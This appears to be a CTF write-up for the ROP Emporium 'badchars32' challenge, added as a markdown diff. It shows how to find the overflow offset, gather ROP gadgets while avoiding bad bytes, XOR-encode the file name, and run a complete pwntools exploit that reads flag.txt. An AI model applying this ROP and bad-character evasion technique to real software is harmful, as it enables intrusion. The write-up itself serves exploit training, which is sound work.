@@ -1,0 +1,232 @@
+# Basic Test:
+
+## Check call system into binary file
+```bash
+strace ./badchars32
+```
+
+## Check protection into binary file
+```bash
+checksec ./badchars32
+```
+
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+    RUNPATH:  b'.'
+
+<br>
+
+# Exploitation:
+
+## Clear the kernel ring buffer
+```bash
+sudo dmesg -C
+```
+
+## Find offset for overwrite RIP
+```bash
+python2 -c 'print "A"*44 + "B"*4*' | ./badchars32
+```
+
+## See output
+```bash
+sudo dmesg -T
+```
+
+	[mar. avril 11 22:58:43 2023] badchars32[124001]: segfault at 42424242 ip 0000000042424242 sp 00000000ff8bfcf0 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)
+
+## Find the a gadget for two parameters for moving into a section writable
+
+```bash
+ROPgadget --binary ./badchars32 --badbytes '78|67|61|2e' | grep 'pop esi'
+```
+ 
+	0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
+
+## Find a section writable
+```bash
+readelf -S ./badchars32 | grep -B 1 'WA'
+```
+
+	  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
+
+## Find a gadget for moving the file name into .data
+```bash
+ROPgadget --binary ./badchars32 --badbytes '78|67|61|2e' | grep 'mov dword'
+```
+
+	0x0804854f : mov dword ptr [edi], esi ; ret
+
+## We need to xor the file name for bypass  them badchars
+```python
+xored_string = xor("flag.txt", 2)
+```
+
+## Find a gadget for one parameter to decode xored file name
+```bash
+ROPgadget --binary ./badchars32 --badbytes '78|67|61|2e' | grep 'pop ebp'
+```
+
+	0x080485bb : pop ebp ; ret
+
+## Find a gadget other one parameter to decode xored file name
+```bash
+ROPgadget --binary ./badchars32 --badbytes '78|67|61|2e' | grep 'pop ebx'
+```
+
+	0x0804839d : pop ebx ; ret
+
+## Find a xor gadget for decode xored file name
+```bash
+ROPgadget --binary ./badchars32 --badbytes '78|67|61|2e' | grep 'xor byte'
+```
+
+	0x08048547 : xor byte ptr [ebp], bl ; ret
+
+## Find the address of the print_file function
+```bash
+pwngdb> disass*usefulFunction
+```
+
+	   0x0804852a <+0>:     push   ebp
+	   0x0804852b <+1>:     mov    ebp,esp
+	   0x0804852d <+3>:     sub    esp,0x8
+	   0x08048530 <+6>:     sub    esp,0xc
+	   0x08048533 <+9>:     push   0x80485e0
+	   0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
+	   0x0804853d <+19>:    add    esp,0x10
+	   0x08048540 <+22>:    nop
+	   0x08048541 <+23>:    leave
+	   0x08048542 <+24>:    ret
+
+## Python pwntools script
+```python
+#!/usr/bin/python3
+from pwn import *
+"""
+Arch: i386-32-little
+RELRO: Partial RELRO
+Stack: No canary found
+NX: NX enabled
+PIE: No PIE (0x8048000)
+RUNPATH: b'.'
+"""
+# For example, to dump all data sent/received, and disable ASLR
+# ./exploit.py DEBUG NOASLR
+
+def start(argv=[], *a, **kw):
+	if args.GDB: # Set GDBscript below
+		return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
+	elif args.REMOTE: # {"server", "port"}
+		return remote(sys.argv[1], sys.argv[2], *a, **kw)
+	else: # Run locally
+		return process([binary] + argv, *a, **kw)
+
+def find_eip(payload):
+	# Launch process
+	p = process(binary)
+	p.sendlineafter(">", payload) # If we have a text in get() or read() we need to copy and past in str argument, but if we don't have text in input we can just let ">"
+	# Wait for the process to crash
+	p.wait()
+	#eip_offset = cyclic_find(p.corefile.esp) # x86
+	eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4)) # x64
+	info("Located $RIP offset at {a}".format(a=eip_offset))
+	# Return the offset EIP
+	return eip_offset
+
+# Specify GDB script for debugging
+gdbscript = '''
+continue
+'''.format(**locals())
+
+# Setup pwntools for the correct architecture
+binary = "./badchars32"
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(binary, checksec=False)
+# Enable verbose logging we can see exactly what is being sent (info/debug)
+context.log_level = "info"
+
+# ================================================================
+# EXPLOIT GOES HERE
+# ================================================================
+
+# Start program
+io = start()
+
+# badchars are: 'x', 'g', 'a', '.'
+
+# Function payload
+padding = b"A"*44
+pop_esi_edi_ebp = 0x080485b9
+value_to_xor = 2
+xored_string = xor("flag.txt", value_to_xor)
+data_section = 0x0804a018
+mov_dword_edi_esi = 0x0804854f
+data_section_4 = 0x0804a018+4
+pop_ebp = 0x080485bb
+pop_ebx = 0x0804839d
+xor_byte_ebp_bl = 0x08048547
+call_print_file = 0x080483d0
+null = 0x0
+
+# Info variable payload
+info("Padding offset for overwrite EIP: %#s", padding)
+info("Address for pop esi ; pop edi ; pop ebp ; ret: %#x", pop_esi_edi_ebp)
+info("File name to read xored by %#d for bypass badchars: %#s", value_to_xor, xored_string)
+info("Address for .data section who should write permission: %#x", data_section)
+info("Address for mov dword ptr [edi], esi ; ret: %#x", mov_dword_edi_esi)
+info("Address for section .data+4 for write after the four first bytes: %#x", data_section_4)
+info("Address for pop ebp ; ret: %#x", pop_ebp)
+info("Address for pop ebx ; ret: %#x", pop_ebx)
+info("Address for xor byte ptr [ebp], bl ; ret: %#x", xor_byte_ebp_bl) # bl[8 bytes] === ebx[32 bytes]
+info("Address for call print file function and read the file: %#x", call_print_file)
+info("Null bytes for write into the third registers which is not useful: %#x", null)
+
+# Decode the file name to read
+xor_exploit = b""
+for c in range(len(xored_string)):
+	xor_exploit += pack(pop_ebp)
+	xor_exploit += pack(data_section+c)
+	xor_exploit += pack(pop_ebx)
+	xor_exploit += pack(value_to_xor)
+	xor_exploit += pack(xor_byte_ebp_bl)
+
+  
+
+# Build the payload
+
+payload = flat(
+	padding,
+	pop_esi_edi_ebp,
+	xored_string[:4],
+	data_section,
+	null,
+	mov_dword_edi_esi,
+	
+	pop_esi_edi_ebp,
+	xored_string[4:],
+	data_section_4,
+	null,
+	mov_dword_edi_esi,
+	
+	xor_exploit,
+	
+	call_print_file,
+	null, # OR pop ebp register
+	data_section
+)
+
+# Send the payload
+io.sendlineafter(">", payload) # If we have a text in get() or read() we need to copy and past in str argument, but if we don't have text in input we can just let ">"
+io.recvuntil("Thank you!\n")
+
+# Get flag
+flag = io.recv()
+success(flag)
+
+# Spawn shell
+#io.interactive()
+```
